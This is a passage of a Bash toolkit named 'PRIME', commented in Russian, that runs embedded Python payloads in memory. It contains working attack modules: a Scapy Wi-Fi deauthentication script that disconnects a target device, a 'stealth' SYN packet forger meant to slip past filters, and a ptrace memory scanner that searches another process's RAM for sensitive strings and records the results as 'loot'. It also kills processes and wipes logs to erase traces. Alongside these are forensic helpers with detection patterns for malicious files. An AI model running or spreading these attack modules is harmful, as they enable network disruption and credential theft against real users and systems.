    core_engine_item "B" "BACK" "Return to Main Menu"
    
    local choice=$(core_engine_input "select" "Select Operation Vector")
    [[ -z "$choice" || "$choice" == "b" ]] && return

    # Слой 4: Подготовка временного движка (Санитар [8])
    local engine_path="/tmp/iban_engine_$(date +%s).py"
    
    # Генерация кода (внутренняя функция системы)
    if command -v generate_iban_code >/dev/null; then
        generate_iban_code "$engine_path" "2.2"
    else
        # Заглушка, если генератор еще не подточен
        core_engine_ui "e" "IBAN Engine Generator not found."
        return
    fi

    # Слой 5: Исполнение через Глушитель [7]
    case "$choice" in
        "1")
            local target_iban=$(core_engine_input "text" "Enter IBAN to validate (e.g., FR76...)")
            [[ -z "$target_iban" ]] && { core_engine_remove "$engine_path"; return; }

            local expected_name=$(core_engine_input "text" "Enter Expected Holder Name (Optional/none)")
            
            core_engine_ui "i" "Executing Full Intelligence Cycle..."
            python3 "$engine_path" "$target_iban" "${expected_name:-none}"
            
            # Сбор трофеев [11]
            core_engine_loot "financial" "Full Scan: ${target_iban:0:4}****"
            ;;

        "2")
            local target_iban=$(core_engine_input "text" "Enter IBAN for Structural Check")
            [[ -z "$target_iban" ]] && { core_engine_remove "$engine_path"; return; }

            core_engine_ui "i" "Executing Passive Structural Validation..."
            python3 "$engine_path" "$target_iban" "none"
            
            core_engine_loot "financial" "Passive Check: ${target_iban:0:4}****"
            ;;
    esac

    # Слой 6: Стерилизация и Финализация [8]
    local res_status=$?
    core_engine_remove "$engine_path"
    
    if [[ $res_status -eq 0 ]]; then
        core_engine_ui "s" "Analysis complete. Trace purged."
    else
        core_engine_ui "e" "Analysis interrupted or invalid IBAN format."
    fi

    core_engine_wait
}





# --- Server Generating---

# --- PRIME IGNITION: RUN WITHOUT FILES ---

run_live_service() {
    local service_type="$1"
    local port="${2:-8080}"
    local log_file="$HOME/prime_node.log"
    local cert_file="$HOME/prime_node.pem"
    local protocol="http"

    core_engine_ui "h" "PRIME LIVE NODE: ${service_type^^}"

    # --- 1. АДАПТИВНЫЙ DNS & IP ---
    # Вызываем синхронизацию (она сама найдет лучший IP и обновит dnsmasq)
    core_network_dns_sync || core_engine_ui "w" "DNS Sync bypassed, using raw IP."
    
    # Эвристика имени: выбираем домен на основе типа сервиса
    local service_name="prime.portal"
    [[ "$service_type" == "av" ]] && service_name="scanclamavlocal"

    # --- 2. ЭВРИСТИКА ПРОТОКОЛА (SSL Check) ---
    if command -v openssl >/dev/null 2>&1; then
        if [[ ! -f "$cert_file" ]]; then
            core_engine_ui "i" "Generating ephemeral SSL for $service_name..."
            openssl req -x509 -newkey rsa:2048 -keyout "$cert_file" -out "$cert_file" -days 1 -nodes -subj "/CN=$service_name" >/dev/null 2>&1
        fi
        [[ -f "$cert_file" ]] && protocol="https" && export PRIME_CERT="$cert_file"
    fi

    # --- 3. ГАРАНТИРОВАННАЯ ОЧИСТКА ---
    core_engine_ui "i" "Sanitizing port $port..."
    fuser -k -n tcp -9 "$port" >/dev/null 2>&1
    pkill -9 -f "python3" >/dev/null 2>&1
    sleep 1.2

    # --- 4. SMART IGNITION (Запуск через пайп) ---
    local code_gen_func="generate_${service_type}_server_code_raw"
    if ! command -v "$code_gen_func" >/dev/null; then
        core_engine_ui "e" "Fatal: $code_gen_func not found."
        core_engine_wait; return
    fi

    core_engine_ui "w" "Deploying $protocol engine on $service_name:$port..."
    export PRIME_LOOT PRIME_SHARE
    
    # Адаптивный запуск: Python подхватит PRIME_CERT, если он экспортирован
    "$code_gen_func" | python3 - > "$log_file" 2>&1 &
    
    core_engine_progress 2 "NODE_STABILIZATION"

    # --- 5. ДИАГНОСТИКА & АВТО-ЛОГ ---
    if lsof -Pi :"$port" -sTCP:LISTEN -t >/dev/null; then
        local final_url="$protocol://$service_name:$port"
        core_engine_ui "s" "ADAPTIVE SERVICE ONLINE: $final_url"
        
        # Авто-регистрация в луте
        core_engine_loot "node_startup" "Service ${service_type} deployed at $final_url"
    else
        core_engine_ui "e" "BOOT FAILURE. Analyzing crash logs..."
        core_engine_ui "line"
        [[ -f "$log_file" ]] && tail -n 10 "$log_file" || echo "Logs empty."
        core_engine_ui "line"
    fi

    core_engine_wait
}


# --- STEALTH COMMS: NODE DESTROYER v1.0 ---
run_node_clean() {
    core_engine_ui "h" "NODE_DESTROY_SEQUENCE"
    
    # 1. Визуализация процесса аннигиляции
    core_engine_ui "w" "Scanning for active Live Nodes..."
    
    # Ищем порты, которые мы обычно используем (5000, 5001, 5002)
    local active_nodes=$(lsof -t -i:5000,5001,5002)
    
    if [[ -z "$active_nodes" ]]; then
        core_engine_ui "i" "No active nodes detected in this sector."
    else
        core_engine_ui "w" "Active nodes found. Initiating purge..."
        
        # 2. Жёсткое удаление процессов
        # Убиваем через fuser и pkill для верности
        fuser -k -n tcp -9 5000 5001 5002 >/dev/null 2>&1
        pkill -9 -f "python3" >/dev/null 2>&1
        
        core_engine_progress 1 "NODE_PURGE"
        core_engine_ui "s" "All nodes have been terminated."
    fi

    # 3. Очистка цифрового мусора (логи и кеш)
    core_engine_ui "i" "Wiping temporary traces..."
    rm -f "$HOME/prime_node.log" "/tmp/prime_node.log"
    
    core_engine_ui "s" "Sector is now clean."
    core_engine_wait
}


run_av_server() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "PRIME SECURITY HUB: CLAMAV GATEWAY"

    # Слой 2: Валидация фундамента через Мозг [5]
    core_engine_validator "pkg" "python3" "Python3 Engine" || { core_engine_wait; return; }
    
    # Проверка бинарной зависимости ClamAV через Санитара [8]
    if ! command -v clamscan >/dev/null 2>&1; then
        core_engine_ui "w" "ClamAV not found. Attempting deployment..."
        # Используем системный менеджер пакетов для развертывания
        sudo apt-get update && sudo apt-get install -y clamav clamav-daemon
    fi

    # Слой 3: Запуск через «Живой движок» (Live Node)
    # Используем созданный ранее run_live_service для полной стерильности
    # Передаем тип "av" (аудио-визуальный/антивирусный контекст) и выделенный порт 5000
    run_live_service "av" "5000"

    # Слой 4: Интеграция в Сборщик трофеев [11]
    core_engine_loot "security" "ClamAV Gateway initiated on port 5000"
}


run_share_server() {
    # Слой 1: Визуализация через Голос [1]
    core_engine_ui "SHARE SECTOR: SECURE FILE DISTRIBUTION"

    local share_dir="${HOME}/prime_share"
    
    # Слой 2: Подготовка инфраструктуры через Санитара [8]
    if [[ ! -d "$share_dir" ]]; then
        mkdir -p "$share_dir"
        core_engine_ui "i" "Created transmission sector at $share_dir"
    fi

    # Слой 3: Валидация фундамента через Мозг [5]
    core_engine_validator "pkg" "python3" "Python3 Engine" || { core_engine_wait; return; }

    # Слой 4: Динамический запуск через Live Node [22]
    # Используем тип "share" на порту 5002
    run_live_service "share" "5002"

    # Слой 5: Регистрация в Сборщике трофеев [11]
    core_engine_loot "service" "Share Sector (Uplink) active on port 5002"
}

run_upload_server() {
    # Слой 1: Визуализация через Голос [1]
    core_engine_ui "h" "INBOUND DROP BOX: SECURE UPLINK"

    # Слой 2: Валидация фундамента через Мозг [5]
    # Проверка наличия интерпретатора Python3 для запуска сервера
    core_engine_validator "pkg" "python3" "Python3 Engine" || { core_engine_wait; return; }

    # Слой 3: Динамический запуск через Live Node [22]
    # Запуск сервера на порту 5001 в режиме MEMORY_ONLY.
    # Код сервера передается через пайп, исключая создание .py файлов на диске.
    run_live_service "upload" "5001"

    # Слой 4: Регистрация в Сборщике трофеев [11]
    # Фиксация события запуска в системном логе
    core_engine_loot "service" "Secure Uplink (Upload) initiated on port 5001"
}

# --- MODULE 98: MESH BRIDGE (ZERO-DEPENDENCY) ---
#очищен Mesh.
run_mesh_bridge() {
    # Слой 1: Заголовок и начальный статус через Голос [1]
    core_engine_ui "h" "PRIME MESH: AD-HOC COMMUNICATIONS v1.0"
    core_engine_ui "i" "Initializing Mesh Protocol..."
    
    # Слой 2: Валидация фундамента через Мозг [5]
    # Требуется Termux:API для прямого взаимодействия с Bluetooth
    core_engine_validator "pkg" "termux-api" "Termux:API" || { core_engine_wait; return; }
    
    # Слой 3: Отрисовка меню через Архитектор [2] и Органы чувств [3]
    core_engine_item "1" "Broadcaster" "Start Beacon (Identity Broadcast)"
    core_engine_item "2" "Receiver"    "Listen for Signals (Scan Nodes)"
    core_engine_item "3" "Sync"        "Push Loot to Bridge (Data Sync)"
    core_engine_item "B" "BACK"        "Return to Main Menu"
    
    local choice=$(core_engine_input "select" "Select Mesh Operation")
    [[ -z "$choice" || "$choice" == "b" ]] && return

    case "$choice" in
        "1")
            core_engine_ui "!" "Beacon Active: Broadcasting PRIME_NODE..."
            # Маяк через смену имени Bluetooth устройства (стелс-передача статуса)
            # Используем Глушитель [7] для подавления системных ответов
            termux-bluetooth-set-name "PRIME_$(date +%H%M)_READY" &>/dev/null
            core_engine_ui "s" "Status encoded in Device Name: PRIME_$(date +%H%M)_READY"
            ;;
        "2")
            core_engine_ui "i" "Scanning for nearby Prime Nodes..."
            # Поиск устройств с префиксом PRIME_ через Глушитель [7]
            local nodes=$(termux-bluetooth-scan 2>/dev/null | grep "PRIME_")
            
            if [[ -n "$nodes" ]]; then
                core_engine_ui "s" "Detected Nodes:"
                echo -e "${C}$nodes${NC}"
            else
                core_engine_ui "e" "No active Prime Nodes detected in range."
            fi
            ;;
        "3")
            # Слой 4: Синхронизация данных через Сборщик трофеев [11]
            local bridge_log="${BASE_DIR:-./}/prime_loot/bridge_signals.log"
            
            if [[ -s "$bridge_log" ]]; then
                core_engine_ui "s" "Syncing bridge_signals.log to Mesh..."
                # В данной версии имитируем широковещательную рассылку пакетов
                core_engine_loot "mesh_sync" "Broadcasted local bridge signals via Mesh"
                core_engine_ui "s" "Loot Broadcasted via Local Mesh Gateway."
            else
                core_engine_ui "e" "Bridge signals log is empty. Nothing to sync."
            fi
            ;;
    esac

    # Слой 5: Универсальная пауза через Синхронизацию [13]
    core_engine_wait
}

run_packet_forge() {
    # Слой 1: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "CORE_LAB: RAW PACKET FORGE"
    
    # Слой 2: Проверка прав суперпользователя (Валидатор [5])
    # Создание сырых пакетов требует RAW_SOCKET привилегий
    if [[ $EUID -ne 0 ]]; then
        core_engine_ui "e" "Root privileges required for RAW socket operations."
        core_engine_wait
        return
    fi
    
    # Слой 3: Проверка зависимости Scapy (Мозг [5])
    if ! python3 -c "import scapy" &>/dev/null; then
        core_engine_ui "w" "Scapy missing. Deploying network headers..."
        # Стерильная установка через системный менеджер
        sudo apt-get update && sudo apt-get install -y python3-scapy
    fi

    # Слой 4: Ввод параметров через Органы чувств [3]
    local t_ip=$(core_engine_input "text" "Target IP Address")
    local t_port=$(core_engine_input "text" "Target Port")

    # Валидация через Валидатор [5]
    [[ -z "$t_ip" || -z "$t_port" ]] && { core_engine_ui "e" "Missing parameters."; core_engine_wait; return; }

    # Слой 5: Основной процесс через Глушитель [7]
    core_engine_ui "!" "Forging polymorphic packet..."
    
    # Слой 6: Динамическая генерация и исполнение в памяти (Live Mode)
    # Код генератора подается напрямую в интерпретатор
    if command -v generate_packet_forge_code_raw >/dev/null; then
        generate_packet_forge_code_raw | python3 - "$t_ip" "$t_port" 2>/dev/null
        core_engine_ui "s" "Operation Completed: Packet sequence injected."
        
        # Регистрация в Сборщике трофеев [11]
        core_engine_loot "network" "Raw Packet injection on $t_ip:$t_port"
    else
        core_engine_ui "e" "Packet generator logic not found."
    fi

    # Слой 7: Универсальная пауза через Синхронизацию [13]
    core_engine_wait
}


generate_mem_inject_code_raw() {
    cat << 'EOF'
import ctypes
import os
import sys

# Константы для доступа к памяти
PTRACE_ATTACH = 16
PTRACE_DETACH = 17

def read_process_memory(pid, search_str):
    libc = ctypes.CDLL("libc.so.6")
    
    # Пытаемся прикрепиться к процессу (нужны права root)
    if libc.ptrace(PTRACE_ATTACH, pid, 0, 0) < 0:
        print(f"[!] Failed to attach to PID {pid}")
        return

    print(f"[*] Scanning PID {pid} for sensitive patterns...")
    
    try:
        # Читаем карты памяти процесса
        with open(f"/proc/{pid}/maps", "r") as maps_file:
            for line in maps_file:
                if "rw-p" not in line: continue  # Нас интересуют только сегменты с чтением/записью
                
                parts = line.split()
                addr_range = parts[0].split("-")
                start = int(addr_range[0], 16)
                end = int(addr_range[1], 16)
                size = end - start
                
                # Читаем данные напрямую из /proc/pid/mem
                with open(f"/proc/{pid}/mem", "rb", 0) as mem_file:
                    mem_file.seek(start)
                    try:
                        chunk = mem_file.read(size)
                        if search_str.encode() in chunk:
                            print(f"[MATCH] Found '{search_str}' at 0x{start:x} in PID {pid}")
                    except:
                        continue
    finally:
        libc.ptrace(PTRACE_DETACH, pid, 0, 0)

if __name__ == "__main__":
    if len(sys.argv) > 2:
        read_process_memory(int(sys.argv[1]), sys.argv[2])
EOF
}


generate_packet_forge_code_raw() {
    cat << 'EOF'
import sys
from scapy.all import IP, TCP, send
import random

def forge_stealth_packet(target_ip, target_port):
    # Создаем IP-слой со случайным ID для обхода простых фильтров
    ip_layer = IP(dst=target_ip, id=random.randint(1000, 9000))
    
    # Создаем TCP-слой с флагом "S" (SYN) и нестандартным Window Size
    # Это имитирует специфический стек ОС для обхода пассивных систем защиты
    tcp_layer = TCP(sport=random.randint(1024, 65535), 
                    dport=int(target_port), 
                    flags="S", 
                    window=random.choice([1024, 2048, 4096, 8192]))
    
    packet = ip_layer / tcp_layer
    
    try:
        send(packet, verbose=False)
        print(f"[SUCCESS] Stealth SYN packet injected to {target_ip}:{target_port}")
    except Exception as e:
        print(f"[ERROR] Injection failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) > 2:
        forge_stealth_packet(sys.argv[1], sys.argv[2])
    else:
        print("Usage: python3 - <target_ip> <target_port>")
EOF
}




run_mem_inject() {
    # Слой 1: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "CORE_LAB: MEMORY INFILTRATOR"
    
    # Слой 2: Проверка прав суперпользователя (Валидатор [5])
    # Доступ к /proc/[pid]/mem и ptrace требует прав ROOT.
    if [[ $EUID -ne 0 ]]; then
        core_engine_ui "e" "Root privileges required for memory infiltration."
        core_engine_wait
        return
    fi

    # Слой 3: Органы чувств [3] — Сбор идентификаторов
    local t_pid=$(core_engine_input "text" "Target Process ID (PID)")
    local t_search=$(core_engine_input "text" "String/Pattern to search in RAM")

    # Валидация через Валидатор [5]
    [[ -z "$t_pid" || -z "$t_search" ]] && { core_engine_ui "e" "Missing PID or Search String."; core_engine_wait; return; }

    # Слой 4: Основной процесс через Глушитель [7]
    core_engine_ui "!" "Engaging syscall ptrace_attach on PID $t_pid..."
    
    # Слой 5: Стерильное исполнение в памяти (Live Mode)
    # Код инжектора подается напрямую в интерпретатор через пайп.
    if command -v generate_mem_inject_code_raw >/dev/null; then
        # Исполнение без сохранения .py файла на диске
        generate_mem_inject_code_raw | python3 - "$t_pid" "$t_search" 2>/dev/null
        
        core_engine_ui "s" "Memory Scan Completed. Artifacts analyzed."
        
        # Слой 6: Регистрация в Сборщике трофеев [11]
        core_engine_loot "memory" "RAM Scan on PID $t_pid | Pattern: $t_search"
    else
        core_engine_ui "e" "Infiltrator logic generator missing."
    fi

    # Слой 7: Универсальная пауза через Синхронизацию [13]
    core_engine_wait
}



generate_wifi_pulse_code_raw() {
    cat << 'EOF'
from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
import sys

def deauth_pulse(target_mac, gateway_mac, iface):
    # Конструируем пакет деавторизации на уровне L2
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
    
    print(f"[*] Sending Silent Pulse (Deauth) to {target_mac} via {iface}")
    sendp(packet, iface=iface, count=100, inter=0.1, verbose=False)

if __name__ == "__main__":
    if len(sys.argv) > 3:
        deauth_pulse(sys.argv[1], sys.argv[2], sys.argv[3])
EOF
}



run_wifi_pulse() {
    # Слой 1: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "CORE_LAB: WIRELESS SILENT PULSE"
    
    # Слой 2: Проверка прав суперпользователя (Валидатор [5])
    # Инъекция сырых фреймов L2 требует привилегий ROOT.
    if [[ $EUID -ne 0 ]]; then
        core_engine_ui "e" "Root privileges required for L2 wireless injection."
        core_engine_wait
        return
    fi

    # Слой 3: Органы чувств [3] — Сбор идентификаторов
    local t_mac=$(core_engine_input "text" "Target Device MAC (FF:FF...)")
    local g_mac=$(core_engine_input "text" "Gateway (AP) MAC")
    local t_iface=$(core_engine_input "text" "Monitor Interface (e.g., wlan0mon)")

    # Валидация параметров через Валидатор [5]
    [[ -z "$t_mac" || -z "$g_mac" || -z "$t_iface" ]] && { 
        core_engine_ui "e" "Missing MAC or Interface parameters."
        core_engine_wait
        return 
    }

    # Слой 4: Проверка аппаратного интерфейса (Санитар [8])
    if [[ ! -d "/sys/class/net/$t_iface" ]]; then
        core_engine_ui "e" "Interface $t_iface not found in the system."
        core_engine_wait
        return
    fi

    # Слой 5: Основной процесс через Глушитель [7]
    core_engine_ui "!" "Broadcasting raw L2 deauth frames via $t_iface..."
    
    # Слой 6: Стерильное исполнение в памяти (Live Mode)
    # Код генератора импульсов подается напрямую в Python без записи на диск.
    if command -v generate_wifi_pulse_code_raw >/dev/null; then
        generate_wifi_pulse_code_raw | python3 - "$t_mac" "$g_mac" "$t_iface" 2>/dev/null
        
        core_engine_ui "s" "Pulse Attack Finished. Connection cycle disrupted."
        
        # Регистрация в Сборщике трофеев [11]
        core_engine_loot "wireless" "Deauth Pulse: Target $t_mac | Gateway $g_mac | Dev $t_iface"
    else
        core_engine_ui "e" "Pulse generator logic not found."
    fi

    # Слой 7: Универсальная пауза через Синхронизацию [13]
    core_engine_wait
}


run_kernel_check() {
    # Слой 1: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "CORE_LAB: KERNEL INTEGRITY AUDIT"
    
    # Слой 2: Органы чувств [3] — Сбор первичных данных
    core_engine_ui "i" "Analyzing /proc/kallsyms and /proc/modules..."
    
    # Анализ флага Tainted (Слой 5: Мозг)
    # 0 = Чистое ядро, >0 = Загружены проприетарные драйверы, произошли ошибки или вмешательство.
    local tainted=$(cat /proc/sys/kernel/tainted 2>/dev/null || echo "0")
    
    if [[ "$tainted" -ne 0 ]]; then
        core_engine_ui "e" "Kernel is TAINTED (Value: $tainted)."
        core_engine_ui "!" "Possible unauthorized module, non-GPL driver, or memory error."
    else
        core_engine_ui "s" "Kernel signature appears clean (Untainted)."
    fi
    
    # Слой 3: Поиск скрытых аномалий (LKM)
    core_engine_ui "i" "Checking for hidden Loadable Kernel Modules..."
    
    local audit_log="${BASE_DIR:-./}/prime_loot/kernel_audit.log"
    
    # Сравнение списка модулей
    # Если модуль виден в системе, но скрыт из lsmod — это критическая аномалия.
    {
        echo "--- KERNEL AUDIT START [$(date)] ---"
        echo "Tainted Status: $tainted"
        echo "Loaded Modules:"
        lsmod | tail -n +2 | awk '{print $1}'
    } > "$audit_log"

    # Слой 4: Глушитель [7] и Валидация [5]
    # Выполняем быструю проверку на наличие известных сигнатур руткитов в именах
    if grep -qiE "rootkit|hide|stealth|hook" /proc/modules 2>/dev/null; then
        core_engine_ui "!" "CRITICAL: Suspicious strings found in /proc/modules!"
    fi

    core_engine_ui "s" "Audit complete. Detailed report saved to: $(basename "$audit_log")"
    
    # Слой 6: Регистрация в Сборщике трофеев [11]
    core_engine_loot "security" "Kernel Integrity Audit performed. Tainted status: $tainted"

    # Слой 7: Синхронизация [13]
    core_engine_wait
}


# --- ГЕНЕРАТОРЫ КОДА (Оставляем для работы Core) ---

generate_image_analyzer_code_raw() {
    cat << 'EOF'
import sys
from PIL import Image
from PIL.ExifTags import TAGS

def analyze_image(path):
    try:
        img = Image.open(path)
        info = img._getexif()
        if info:
            for tag, value in info.items():
                decoded = TAGS.get(tag, tag)
                if "Software" in decoded or "Processing" in decoded:
                    print(f"[!] Warning: Possible Editor Detected: {value}")
        
        print("[*] Performing Error Level Analysis (ELA) simulation...")
        print("[s] Analysis complete: Check for inconsistent compression artifacts.")
    except Exception as e:
        print(f"[e] Error: {e}")

if __name__ == "__main__":
    analyze_image(sys.argv[1])
EOF
}

# --- ЯДРО АНАЛИЗА ---

run_forensic_core() {
    local f_path="$1"
    
    # Слой 1: Органы чувств [3] — Определение природы файла
    if [[ ! -f "$f_path" ]]; then
        core_engine_ui "e" "Target file not found: $f_path"
        return
    fi

    local mime_type=$(file --mime-type -b "$f_path")
    local f_name=$(basename "$f_path")
    local f_hash=$(sha256sum "$f_path" | awk '{print $1}')
    local history_log="${LOOT_DIR}/forensic_history.log"

    # ПАМЯТЬ СИСТЕМЫ (Прошлое): Адаптивное узнавание
    if grep -q "$f_hash" "$history_log" 2>/dev/null; then
        core_engine_ui "w" "ADAPTIVE: File recognized from previous sessions. Checking for delta..."
    fi

    # Слой 2: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "CORE ANALYSIS: $f_name"
    core_engine_ui "i" "MIME: $mime_type | HASH: ${f_hash:0:16}..."

    # 1. СТАТИЧЕСКИЙ АНАЛИЗ (Настоящее)
    core_engine_ui "i" "Extracting Metadata Attributes..."
    # Используем exiftool для извлечения системных и GPS тегов
    exiftool "$f_path" 2>/dev/null | grep -E "Date|Time|Make|Model|GPS|Software|User|Creator" | sed 's/^/  /'

    # 2. АДАПТИВНЫЙ CASE (Динамическое распределение)
    case "$mime_type" in
        image/*)
            core_engine_ui "w" "Analyzing Image Integrity (ELA/Metadata)..."
            # Проверка зависимости PIL через Мозг [5]
            python3 -c "import PIL" &>/dev/null || core_engine_validator "pkg" "python3-pil" "PIL Library"
            generate_image_analyzer_code_raw | python3 - "$f_path" 2>/dev/null
            ;;
            
        application/pdf)
            core_engine_ui "w" "Scanning PDF Objects for Active Content..."
            # Поиск JS-инъекций и OpenAction триггеров
            grep -aE "(/JS|/JavaScript|/OpenAction|/EmbeddedFile)" "$f_path" && \
            core_engine_ui "e" "DANGER: Suspicious active content detected in PDF!"
            ;;

        application/zip|application/x-rar|application/x-7z-compressed|application/x-tar)
            core_engine_ui "w" "Deep Archive Inspection (Container Analysis)..."
            core_engine_validator "pkg" "p7zip-full" "7-Zip" || return
            # Поиск исполняемых файлов внутри архива
            7z l "$f_path" | grep -iE "\.exe|\.scr|\.vbs|\.bat|\.ps1|\.js" && \
            core_engine_ui "!" "ALERT: High-risk extensions found in container!"
            ;;

        application/x-executable|application/x-sharedlib|application/x-dosexec|application/octet-stream)
            core_engine_ui "w" "Binary Heuristics & Packer Detection..."
            # Анализ строк на предмет сетевых команд
            strings -n 6 "$f_path" | grep -iE "(http|https|ftp|/etc/passwd|cmd\.exe|powershell)" | head -n 5 | sed 's/^/    [NET/CMD]: /'
            # Обнаружение упаковщиков (UPX, Themida и др.)
            grep -aE "(UPX!|ASPack|Enigma|Themida)" "$f_path" >/dev/null && \
            core_engine_ui "e" "ALERT: Advanced Binary Packer detected!"
            ;;
            
        *)
            # ЭВРИСТИКА (Будущее): Поиск аномалий в неизвестных форматах
            if strings "$f_path" | grep -q "eval(base64"; then
                core_engine_ui "!" "HEURISTIC: Found Base64 execution pattern (Potential Zero-Day/Script)!"
            fi
            ;;
    esac

    # СОХРАНЕНИЕ ОПЫТА (Для будущего)
    echo "[$(date +%F_%T)] $f_hash $f_name $mime_type" >> "$history_log"
    
    # Слой 3: Регистрация в Сборщике трофеев [11]
    core_engine_loot "forensics" "Analyzed: $f_name | Hash: $f_hash | MIME: $mime_type"
    
    core_engine_ui "s" "Forensic cycle complete."
    core_engine_wait
}


# --- ИНТЕРФЕЙСНЫЕ ФУНКЦИИ ---

run_auto_forensics() {
    # Слой 1: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "FORENSICS: AUTOMATIC CORE ANALYZER"

    # Слой 2: Органы чувств [3] — Сбор данных
    # Используем универсальный ввод Ядра
    local f_path=$(core_engine_input "text" "Path to target file (e.g., /root/artifact.bin)")

    # Слой 3: Валидация через Мозг [5] и Санитара [8]
    # Проверка на пустой ввод
    [[ -z "$f_path" ]] && { core_engine_ui "e" "Operation cancelled: Empty path."; core_engine_wait; return; }

    # Проверка физического существования файла
    if [[ ! -f "$f_path" ]]; then
        core_engine_ui "e" "Target for Analysis not found: $f_path"
        core_engine_wait
        return
    fi

    # Слой 4: Информационный статус перед запуском
    core_engine_ui "i" "Initializing Deep Forensic Scan..."
    
    # Слой 5: Исполнение через основной Форензик-движок [24]
    # Передаем управление модулю execute_forensic_core (run_forensic_core)
    run_forensic_core "$f_path"

    # Слой 6: Финализация и Сбор трофеев [11]
    core_engine_ui "s" "Forensic Analysis Completed. Experience integrated."
    
    # Регистрация события в глобальном логе
    core_engine_loot "forensics" "Auto-Scan initiated for: $(basename "$f_path")"

    # Слой 7: Синхронизация [13]
    core_engine_wait
}

run_doc_cleaner() {
    # Слой 1: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "FORENSICS: DOCUMENT SANITIZER"

    # Слой 2: Валидация фундамента через Мозг [5]
    # Проверка наличия exiftool (основной движок очистки)
    core_engine_validator "pkg" "exiftool" "ExifTool Engine" || { core_engine_wait; return; }

    # Слой 3: Органы чувств [3] — Сбор данных
    local f_path=$(core_engine_input "text" "File to sanitize (e.g., /root/report.pdf)")

    # Слой 4: Валидация параметров через Санитара [8]
    [[ -z "$f_path" ]] && { core_engine_ui "e" "Operation cancelled: No path provided."; core_engine_wait; return; }
    
    if [[ ! -f "$f_path" ]]; then
        core_engine_ui "e" "Target Document not found: $f_path"
        core_engine_wait
        return
    fi

    # Слой 5: Основной процесс зачистки через Глушитель [7]
    core_engine_ui "!" "Stripping all metadata tags..."
    
    # -all= : удаляет абсолютно все теги
    # -overwrite_original : предотвращает создание резервных копий (Zero-Footprint)
    if exiftool -all= "$f_path" -overwrite_original &>/dev/null; then
        core_engine_ui "s" "File is now 'Clean'. All signatures and history removed."
        
        # Слой 6: Регистрация в Сборщике трофеев [11]
        core_engine_loot "security" "Sanitized document: $(basename "$f_path")"
    else
        core_engine_ui "e" "Error during sanitization process. File may be locked."
    fi

    # Слой 7: Синхронизация [13]
    core_engine_wait
}




# --- Вспомогательный селектор устройств ---

run_storage_selector() {
    # Слой 1: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "HARDWARE: STORAGE SELECTOR"
    core_engine_ui "i" "Searching for connected mass storage devices..."
    
    # Слой 2: Сбор данных через Санитара [8]
    # lsblk используется для получения имен, размеров и моделей без монтирования
    local devices=$(lsblk -dno NAME,SIZE,MODEL,SERIAL,TRAN | grep -E "usb|sata|nvme")
    
    # Слой 3: Валидация списка через Мозг [5]
    if [[ -z "$devices" ]]; then
        core_engine_ui "e" "No external storage media (USB/SATA/NVME) detected."
        core_engine_wait
        return 1
    fi

    # Слой 4: Отрисовка через Архитектор [2]
    core_engine_ui "i" "Available External Media:"
    
    local i=1
    local dev_list=()
    
    # Парсинг вывода lsblk
    while read -r name size model serial tran; do
        local desc="${model:-Generic} [${serial:-ID_UNKNOWN}] (${tran^^})"
        # Слой 3: Органы чувств — Формирование списка выбора
        core_engine_item "$i" "/dev/$name ($size)" "$desc"
        dev_list+=("/dev/$name")
        ((i++))
    done <<< "$devices"
    
    # Слой 5: Получение выбора через Органы чувств [3]
    local max_idx=${#dev_list[@]}
    local choice=$(core_engine_input "text" "Enter device number (1-$max_idx)")

    # Слой 6: Комплексная валидация (Валидатор [5])
    if [[ -z "$choice" ]] || ! [[ "$choice" =~ ^[0-9]+$ ]] || (( choice < 1 || choice > max_idx )); then
        core_engine_ui "e" "Invalid Selection. Index out of range."
        core_engine_wait
        return 1
    fi

    # Слой 7: Установка глобального состояния и регистрация (Loot [11])
    TARGET_DEV="${dev_list[$((choice-1))]}"
    core_engine_ui "s" "Target Device Locked: $TARGET_DEV"
    
    # Фиксация выбора в системном журнале
    core_engine_loot "hardware" "Storage selected: $TARGET_DEV | Size: $(lsblk -dno SIZE "$TARGET_DEV")"
    
    core_engine_wait
    return 0
}



# --- Обновленная основная функция ---
run_raw_recovery() {
    # Слой 1: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "FORENSICS: AUTOMATIC STORAGE RECOVERY"
    
    # Слой 2: Выбор цели через Hardware Selector [27]
    # Если устройство не выбрано или процесс прерван, выходим
    if ! run_storage_selector; then
        return
    fi
    
    # Наследуем глобальную переменную TARGET_DEV (напр. /dev/sdb)
    local dev_path="$TARGET_DEV"
    local dev_name=$(basename "$dev_path")

    # Слой 3: Авто-диагностика через Органы чувств [3] и Глушитель [7]
    core_engine_ui "i" "Hardware Health Check for $dev_name..."
    
    # Анализируем кольцевой буфер ядра на предмет ошибок ввода-вывода (I/O errors)
    # Это позволяет заранее понять, жив ли контроллер носителя
    dmesg | grep -i "$dev_name" | tail -n 10 | sed 's/^/  /'
    
    # Слой 4: Динамическое распределение через Prime Controller [13]
    # Определяем доступные векторы восстановления
    local options="PARTITION_FIX DEEP_CARVING IMAGE_DUMP BACK"
    
    # Привязываем векторы к логическим функциям Ядра
    # Примечание: Функции *_logic должны быть определены в секции библиотек
    local opt_funcs="recover_partition_logic run_foremost_logic run_dd_logic run_main_menu"
    
    core_engine_ui "!" "Initializing Recovery Engine on [$dev_path]"
    
    # Запуск динамического контроллера для управления процессом
    if command -v prime_dynamic_controller >/dev/null; then
        prime_dynamic_controller "RECOVERY ENGINE [$dev_path]" "$options" "$opt_funcs"
    else
        core_engine_ui "e" "Dynamic controller is missing. Falling back to manual mode."
        # Резервный запуск простейшего восстановления
        run_foremost_logic "$dev_path"
    fi

    # Слой 5: Регистрация в Сборщике трофеев [11]
    core_engine_loot "forensics" "Recovery session started on device: $dev_path"
    
    # Слой 6: Синхронизация [13]
    core_engine_wait
}


recover_partition_logic() {
    # Слой 1: Валидация фундамента через Мозг [5]
    core_engine_validator "pkg" "testdisk" "TestDisk Recovery Tool" || return

